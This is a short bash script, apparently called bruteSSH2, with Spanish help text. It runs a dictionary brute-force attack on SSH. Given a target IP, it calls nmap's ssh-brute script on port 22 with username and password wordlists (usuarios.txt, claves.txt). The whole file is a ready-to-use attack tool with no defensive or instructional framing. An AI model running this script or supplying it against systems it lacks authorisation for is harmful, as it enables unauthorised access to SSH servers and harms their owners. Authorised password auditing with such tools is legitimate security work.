#!/bin/bash
cat << "INFO"

bruteSSH2

INFO
if [ -z "$1" ]; then
        echo
        echo "Fuerza bruta con diccionarios a SSH."
        echo "Requiere nmap"
        echo "Uso.: sh brutessh2.sh <ip>"
        echo
        exit 0
fi
echo
echo
nmap -p 22 --script ssh-brute --script-args userdb=usuarios.txt,passdb=claves.txt $1